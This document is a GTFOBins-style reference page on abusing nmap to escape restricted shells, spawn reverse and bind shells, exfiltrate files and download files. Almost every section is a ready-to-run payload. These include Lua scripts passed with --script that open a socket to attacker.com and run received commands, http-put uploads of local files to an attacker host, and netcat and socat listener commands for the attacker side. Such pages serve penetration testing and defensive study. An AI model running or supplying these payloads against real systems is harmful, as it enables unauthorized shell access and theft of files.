# GTFOBin: nmap

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

Input echo is disabled.

```
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
nmap --script=$TF
```

The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.

```
nmap --interactive
nmap> !sh
```

## Non-interactive reverse shell

It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.

Run `nc -l -p 12345` on the attacker box to receive the shell.

```
export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp)
echo 'local s=require("socket");
local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
while true do
  local r,x=t:receive();local f=assert(io.popen(r,"r"));
  local b=assert(f:read("*a"));t:send(b);
end;
f:close();t:close();' > $TF
nmap --script=$TF
```

## Non-interactive bind shell

It can bind a non-interactive shell to a local port to allow remote network access.

Run `nc target.com 12345` on the attacker box to connect to the shell.

```
export LPORT=12345
TF=$(mktemp)
echo 'local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
while true do
  local r,x=c:receive();local f=assert(io.popen(r,"r"));
  local b=assert(f:read("*a"));c:send(b);
end;c:close();f:close();' > $TF
nmap --script=$TF
```

## File upload

It can exfiltrate files on the network.

Send a local file via TCP. Run `socat -v tcp-listen:8080,reuseaddr,fork - on the attacker box to collect the file or use a proper HTTP server. Note that multiple connections are made to the server. Also, it is important that the port is a commonly used HTTP like 80 or 8080.

```
RHOST=attacker.com
RPORT=8080
LFILE=file_to_send
nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE
```

Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.

```
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
TF=$(mktemp)
echo 'local f=io.open(os.getenv("LFILE"), 'rb')
local d=f:read("*a")
io.close(f);
local s=require("socket");
local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
t:send(d);
t:close();' > $TF
nmap --script=$TF
```

## File download

It can download remote files.

Fetch a remote file via TCP. Run a proper HTTP server on the attacker box to send the file, e.g., `php -S 0.0.0.0:8080`. Note that multiple connections are made to the server and the result is placed in `$TF/IP/PORT/PATH`. Also, it is important that the port is a commonly used HTTP like 80 or 8080.

```
RHOST=attacker.com
RPORT=8080
TF=$(mktemp -d)
LFILE=file_to_save
nmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE
```

Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file.

```
export LPORT=12345
export LFILE=file_to_save
TF=$(mktemp)
echo 'local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
local d,x=c:receive("*a");
c:close();
local f=io.open(os.getenv("LFILE"), "wb");
f:write(d);
io.close(f);' > $TF
nmap --script=$TF
```